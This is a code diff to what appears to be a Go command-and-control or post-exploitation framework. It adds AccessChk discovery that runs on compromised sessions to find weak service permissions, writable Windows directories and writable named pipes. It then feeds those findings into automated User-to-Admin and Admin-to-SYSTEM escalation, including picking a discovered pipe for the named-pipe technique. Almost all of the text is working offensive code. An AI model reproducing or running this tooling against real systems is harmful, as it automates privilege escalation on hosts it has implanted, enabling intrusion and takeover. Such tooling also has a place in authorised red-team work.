@@ -2532,6 +2532,28 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 
 	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)
 
+	// Step 1.5: Run AccessChk discovery (if available) for pre-escalation intelligence
+	var accessChkMatches []privesc.ModuleMatch
+	fmt.Printf("[*] Step 1.5: Running AccessChk permission discovery...\n")
+	accessChkOutput, err := is.executeAccessChk(sessionID)
+	if err == nil && accessChkOutput != "" {
+		fmt.Printf("[+] AccessChk discovery completed\n")
+		// Analyze AccessChk output
+		matches, err := is.privescIntelligence.AnalyzeAccessChkOutput(accessChkOutput)
+		if err == nil && len(matches) > 0 {
+			fmt.Printf("[+] Found %d exploitable permissions via AccessChk\n", len(matches))
+			accessChkMatches = matches
+			// Log high-confidence findings
+			for _, match := range matches {
+				if match.Confidence == "High" {
+					fmt.Printf("    [HIGH] %s: %s\n", match.Name, match.Reason)
+				}
+			}
+		}
+	} else {
+		fmt.Printf("[!] AccessChk not available or failed - continuing with PrivescCheck only\n")
+	}
+
 	// Step 2: If user, try to escalate to admin first
 	if currentPriv == core.PrivilegeUser {
 		fmt.Printf("[*] Step 2: Current user -> Admin escalation needed\n")
@@ -2583,6 +2605,25 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 			}
 		}
 
+		// Merge AccessChk findings with PrivescCheck recommendations
+		// Prioritize AccessChk findings (they're more specific)
+		for _, match := range accessChkMatches {
+			if match.EscalationType == "User->Admin" {
+				// Check if not already in list
+				found := false
+				for _, existing := range userToAdminModules {
+					if existing.ModuleID == match.ModuleID && existing.Reason == match.Reason {
+						found = true
+						break
+					}
+				}
+				if !found {
+					userToAdminModules = append(userToAdminModules, match)
+					fmt.Printf("[+] Added AccessChk finding: %s (%s)\n", match.Name, match.Reason)
+				}
+			}
+		}
+
 		if len(userToAdminModules) == 0 {
 			return fmt.Errorf("no User->Admin escalation opportunities found by PrivescCheck")
 		}
@@ -2625,27 +2666,53 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 		}
 
 		if !escalatedToAdmin {
-			return fmt.Errorf("failed to escalate from User to Admin. All %d attempts failed.", len(userToAdminModules))
+			return fmt.Errorf("failed to escalate from User to Admin: all %d attempts failed", len(userToAdminModules))
 		}
 	}
 
 	// Step 3: If admin, escalate to SYSTEM
 	if currentPriv == core.PrivilegeAdmin {
 		fmt.Printf("[*] Step 3: Admin -> SYSTEM escalation\n")
+		
+		// Step 3.1: Enumerate named pipes for exploitation opportunities
+		var vulnerablePipes []string
+		fmt.Printf("[*] Step 3.1: Enumerating named pipes for weak permissions...\n")
+		pipes, err := is.executeAccessChkNamedPipes(sessionID)
+		if err == nil && len(pipes) > 0 {
+			fmt.Printf("[+] Found %d vulnerable named pipes\n", len(pipes))
+			vulnerablePipes = pipes
+			for _, pipe := range pipes {
+				fmt.Printf("    [PIPE] %s\n", pipe)
+			}
+		} else {
+			fmt.Printf("[!] Named pipe enumeration not available or no vulnerable pipes found\n")
+		}
+
 		fmt.Printf("[*] Executing Get-System module...\n")
 
-		// Try NamedPipe first, then Token
+		// Prioritize NamedPipe if vulnerable pipes found, otherwise try NamedPipe first, then Token
 		techniques := []string{"NamedPipe", "Token"}
+		if len(vulnerablePipes) > 0 {
+			fmt.Printf("[+] Prioritizing NamedPipe technique due to discovered vulnerable pipes\n")
+			techniques = []string{"NamedPipe", "Token"} // NamedPipe already first
+		}
 		escalatedToSystem := false
 
 		for _, technique := range techniques {
 			fmt.Printf("[*] Trying Get-System with %s technique...\n", technique)
 
+			// Use discovered pipe if available for NamedPipe technique
+			pipeName := ""
+			if technique == "NamedPipe" && len(vulnerablePipes) > 0 {
+				pipeName = vulnerablePipes[0] // Use first discovered pipe
+				fmt.Printf("[+] Using discovered pipe: %s\n", pipeName)
+			}
+
 			params := map[string]interface{}{
 				"session_id":  sessionID,
 				"Technique":   technique,
 				"ServiceName": "",
-				"PipeName":    "",
+				"PipeName":    pipeName,
 			}
 
 			taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
@@ -2725,7 +2792,7 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 		}
 
 		if !escalatedToSystem {
-			return fmt.Errorf("failed to escalate from Admin to SYSTEM. Both techniques failed.")
+			return fmt.Errorf("failed to escalate from Admin to SYSTEM: both techniques failed")
 		}
 	}
 
@@ -2789,6 +2856,27 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 	}
 
 	fmt.Printf("[+] Current user: %s (Privilege: %s)\n", username, currentPriv)
+
+	// Step 1.5: Try AccessChk discovery (if available) - graceful degradation
+	var accessChkMatches []privesc.ModuleMatch
+	fmt.Printf("[*] Step 1.5: Attempting AccessChk discovery (optional, graceful degradation if unavailable)...\n")
+	accessChkOutput, err := is.executeAccessChk(sessionID)
+	if err == nil && accessChkOutput != "" {
+		fmt.Printf("[+] AccessChk discovery completed\n")
+		matches, err := is.privescIntelligence.AnalyzeAccessChkOutput(accessChkOutput)
+		if err == nil && len(matches) > 0 {
+			fmt.Printf("[+] Found %d exploitable permissions via AccessChk\n", len(matches))
+			accessChkMatches = matches
+			// Log findings for intelligence purposes
+			for _, match := range matches {
+				if match.Confidence == "High" {
+					fmt.Printf("    [HIGH] %s: %s\n", match.Name, match.Reason)
+				}
+			}
+		}
+	} else {
+		fmt.Printf("[!] AccessChk not available - continuing with LOLBin-only methods (graceful degradation)\n")
+	}
 
 	// Step 2: If user, escalate to admin using LOLBins
 	if currentPriv == core.PrivilegeUser {
@@ -3159,6 +3247,165 @@ func (is *InteractiveServer) getCallbackURL(session *core.Session) string {
 		}
 	}
 	return callbackURL
+}
+
+// executeAccessChk runs AccessChk to discover weak permissions
+// Returns combined output from multiple AccessChk scans
+func (is *InteractiveServer) executeAccessChk(sessionID string) (string, error) {
+	if is.server == nil {
+		return "", fmt.Errorf("server not initialized")
+	}
+
+	// Validate session exists
+	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
+		return "", fmt.Errorf("session not found: %s", shortID(sessionID))
+	}
+
+	params := map[string]interface{}{
+		"session_id": sessionID,
+	}
+
+	var combinedOutput strings.Builder
+
+	// Command 1: Find services with weak permissions
+	// Note: AccessChk may not be available, so we'll try and handle gracefully
+	fmt.Printf("[*] Running AccessChk to find weak service permissions...\n")
+	taskID1 := fmt.Sprintf("task-%d", time.Now().UnixNano())
+	task1 := &tasks.Task{
+		ID:         taskID1,
+		Type:       "shell",
+		Command:    `accesschk.exe -wsvc * 2>&1`,
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task1)
+	is.pollTaskResultWithTimeout(sessionID, taskID1, 30*time.Second)
+	task1Result := is.taskQueue.Get(taskID1)
+	if task1Result != nil && task1Result.Status == "completed" {
+		if resultMap, ok := task1Result.Result.(map[string]interface{}); ok {
+			if resultValue, ok := resultMap["result"].(string); ok {
+				combinedOutput.WriteString("=== Weak Service Permissions (-wsvc *) ===\n")
+				combinedOutput.WriteString(resultValue)
+				combinedOutput.WriteString("\n\n")
+			}
+		}
+	}
+
+	// Command 2: Find objects writable by Users group
+	fmt.Printf("[*] Running AccessChk to find objects writable by Users group...\n")
+	taskID2 := fmt.Sprintf("task-%d", time.Now().UnixNano())
+	task2 := &tasks.Task{
+		ID:         taskID2,
+		Type:       "shell",
+		Command:    `accesschk.exe -wus "Users" %windir% 2>&1`,
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task2)
+	is.pollTaskResultWithTimeout(sessionID, taskID2, 30*time.Second)
+	task2Result := is.taskQueue.Get(taskID2)
+	if task2Result != nil && task2Result.Status == "completed" {
+		if resultMap, ok := task2Result.Result.(map[string]interface{}); ok {
+			if resultValue, ok := resultMap["result"].(string); ok {
+				combinedOutput.WriteString("=== Writable Objects by Users (%windir%) ===\n")
+				combinedOutput.WriteString(resultValue)
+				combinedOutput.WriteString("\n\n")
+			}
+		}
+	}
+
+	output := combinedOutput.String()
+	if output == "" {
+		return "", fmt.Errorf("AccessChk not available or returned no output. Tool may need to be downloaded.")
+	}
+
+	// Check if AccessChk is available (common error messages)
+	if strings.Contains(strings.ToLower(output), "not recognized") ||
+		strings.Contains(strings.ToLower(output), "not found") ||
+		strings.Contains(strings.ToLower(output), "cannot find") {
+		is.logger.Warn("AccessChk not available on target system")
+		return "", fmt.Errorf("AccessChk not available on target system")
+	}
+
+	return output, nil
+}
+
+// executeAccessChkNamedPipes enumerates named pipes with weak permissions using AccessChk
+func (is *InteractiveServer) executeAccessChkNamedPipes(sessionID string) ([]string, error) {
+	if is.server == nil {
+		return nil, fmt.Errorf("server not initialized")
+	}
+
+	// Validate session exists
+	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
+		return nil, fmt.Errorf("session not found: %s", shortID(sessionID))
+	}
+
+	params := map[string]interface{}{
+		"session_id": sessionID,
+	}
+
+	// Run AccessChk to find named pipes with write permissions
+	taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
+	task := &tasks.Task{
+		ID:         taskID,
+		Type:       "shell",
+		Command:    `accesschk.exe -w \pipe\* 2>&1`,
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task)
+	is.pollTaskResultWithTimeout(sessionID, taskID, 30*time.Second)
+
+	taskResult := is.taskQueue.Get(taskID)
+	if taskResult == nil || taskResult.Status != "completed" {
+		return nil, fmt.Errorf("AccessChk named pipe enumeration failed or timed out")
+	}
+
+	var output string
+	if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
+		if resultValue, ok := resultMap["result"].(string); ok {
+			output = resultValue
+		}
+	}
+
+	if output == "" {
+		return nil, fmt.Errorf("AccessChk returned no output")
+	}
+
+	// Check if AccessChk is available
+	if strings.Contains(strings.ToLower(output), "not recognized") ||
+		strings.Contains(strings.ToLower(output), "not found") ||
+		strings.Contains(strings.ToLower(output), "cannot find") {
+		return nil, fmt.Errorf("AccessChk not available on target system")
+	}
+
+	// Parse output to extract pipe names
+	// AccessChk output format:
+	// \pipe\pipe_name
+	// RW account1
+	// R account2
+	pipes := make([]string, 0)
+	lines := strings.Split(output, "\n")
+	
+	for i, line := range lines {
+		line = strings.TrimSpace(line)
+		
+		// Look for pipe paths (start with \pipe\)
+		if strings.HasPrefix(line, "\\pipe\\") {
+			// Check if next line has write permissions
+			if i+1 < len(lines) {
+				nextLine := strings.TrimSpace(lines[i+1])
+				// If next line has W or RW, this pipe is writable
+				if strings.HasPrefix(nextLine, "W") || strings.HasPrefix(nextLine, "RW") {
+					// Extract pipe name
+					pipeName := strings.TrimPrefix(line, "\\pipe\\")
+					if pipeName != "" {
+						pipes = append(pipes, pipeName)
+					}
+				}
+			}
+		}
+	}
+
+	return pipes, nil
 }
 
 // detectPrivilegeLevel detects the current privilege level of a session
